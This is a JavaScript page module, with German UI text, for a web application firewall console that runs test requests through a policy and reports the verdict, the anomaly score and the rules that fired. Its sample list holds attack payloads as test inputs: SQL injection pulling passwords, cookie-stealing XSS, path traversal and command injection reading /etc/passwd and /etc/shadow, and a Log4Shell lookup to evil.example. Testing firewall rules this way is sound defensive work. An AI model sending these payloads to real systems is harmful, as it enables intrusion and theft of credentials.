import { el, mount, get, post, panel, field, select, errToast, spinner } from '../ui.js';
import { hitsTable } from '../widgets.js';

const SAMPLES = [
  ['Harmlos', 'GET', '/produkte?seite=2&sort=preis', '', ''],
  ['SQL-Injection', 'GET', "/suche?q=1' UNION SELECT username,password FROM users--", '', ''],
  ['XSS', 'GET', '/kommentar?text=<script>alert(document.cookie)</script>', '', ''],
  ['Path Traversal', 'GET', '/download?file=../../../../etc/passwd', '', ''],
  ['Command Injection', 'POST', '/ping', 'Content-Type: application/x-www-form-urlencoded', 'host=127.0.0.1;cat /etc/shadow'],
  ['Log4Shell', 'GET', '/', 'X-Api-Version: ${jndi:ldap://evil.example/a}', ''],
  ['Scanner', 'GET', '/admin', 'User-Agent: sqlmap/1.7.2#stable (https://sqlmap.org)', ''],
  ['JSON-SQLi', 'POST', '/api/login', 'Content-Type: application/json', '{"user":"admin\' OR 1=1--","pass":"x"}'],
];

export async function render(root, _p, scope, q) {
  const pols = (await get('/policies', scope.signal)).policies;
  let customRules = null;
  if (q.get('rules')) { try { customRules = JSON.parse(sessionStorage.getItem('waf.rules') || 'null'); } catch { } }

  let polSel, method, url, headers, body, ip;
  const result = el('div');
  const initialHeaders = q.get('ua') ? 'User-Agent: ' + q.get('ua') : '';
  const form = el('div.stack', null,
    el('div.fields', null,
      field('Konfiguration', polSel = select([['', 'Nur OWASP CRS (Paranoia 1, blockieren)'], ...pols.map(p => [p.id, `Policy: ${p.name}`])], q.get('policy') || (customRules ? '' : pols[0]?.id || ''), () => { })),
      field('Client-IP', ip = el('input', { value: '203.0.113.10' }))),
    customRules ? el('div.callout', null, `Zusätzlich werden ${customRules.length} Regeln aus dem Regelsatz-Editor getestet.`, ' ', el('button.btn.sm', { onclick: () => { customRules = null; render(root, _p, scope, new URLSearchParams()); } }, 'entfernen')) : null,
    el('div.row', { style: { alignItems: 'flex-end', flexWrap: 'nowrap' } },
      field('Methode', method = select(['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS', 'PROPFIND'], q.get('method') || 'GET', () => { })),
      el('label.field.grow', null, el('span', null, 'URL (Pfad und Query)'), url = el('input.mono', { value: q.get('url') || '/', onkeydown: (e) => { if (e.key === 'Enter') run(); } }))),
    el('div.grid.g2', null,
      field('Header (eine Zeile pro Header)', headers = el('textarea.code', { rows: 4, value: initialHeaders, placeholder: 'User-Agent: Mozilla/5.0\nCookie: session=abc' })),
      field('Body', body = el('textarea.code', { rows: 4, placeholder: 'name=wert&x=y oder JSON' }))),
    el('div.row', null,
      el('button.btn.primary', { onclick: () => run() }, 'Request prüfen'),
      el('span.muted', null, 'Beispiele:'),
      SAMPLES.map(([label, m, u, h, b]) => el('button.btn.sm.ghost', { onclick: () => { method.value = m; url.value = u; headers.value = h; body.value = b; run(); } }, label))));

  async function run() {
    const hdrs = {};
    for (const line of headers.value.split('\n')) {
      const i = line.indexOf(':');
      if (i > 0) hdrs[line.slice(0, i).trim()] = line.slice(i + 1).trim();
    }
    mount(result, spinner());
    try {
      const res = await post('/waf/test', { policy: polSel.value, method: method.value, url: url.value, headers: hdrs, body: body.value, client_ip: ip.value, rules: customRules || undefined });
      const verdict = res.interrupted && res.mode === 'block' ? ['bad', 'Blockiert', `Status ${res.status} durch Regel ${res.rule_id}`]
        : res.would_block ? ['warn', 'Würde blockiert', 'Policy im Erkennungsmodus – im Blockiermodus abgelehnt']
        : res.hits?.length ? ['warn', 'Treffer, aber durchgelassen', 'Anomalie-Score unter der Schwelle'] : ['ok', 'Durchgelassen', 'Keine Regel hat angeschlagen'];
      mount(result,
        el('div.kpis', null,
          el('div.kpi.' + verdict[0], { style: { gridColumn: 'span 2' } }, el('div.label', null, 'Ergebnis'), el('div.value', null, verdict[1]), el('div.muted', null, verdict[2])),
          el('div.kpi', null, el('div.label', null, 'Anomalie-Score'), el('div.value', null, res.score)),
          el('div.kpi', null, el('div.label', null, 'Treffer'), el('div.value', null, res.hits?.length || 0)),
          el('div.kpi', null, el('div.label', null, 'Prüfdauer'), el('div.value', null, (res.inspect_us / 1000).toFixed(2), el('small', null, ' ms')), el('div.muted', null, res.compile_ms ? `WAF kompiliert in ${res.compile_ms} ms` : 'aus Cache'))),
        res.error ? el('div.callout.warn', null, res.error) : null,
        res.hits?.length ? panel('Angeschlagene Regeln', hitsTable(res.hits)) : null);
    } catch (e) { mount(result); errToast(e); }
  }

  mount(root,
    el('p.muted', null, 'Schicke einen Test-Request durch die WAF einer Policy – ohne dass er Caddy erreicht. Ideal, um neue Regeln oder Ausnahmen zu prüfen, bevor du sie scharf schaltest.'),
    panel('Request', form), result);
  if (q.get('url')) run();
}
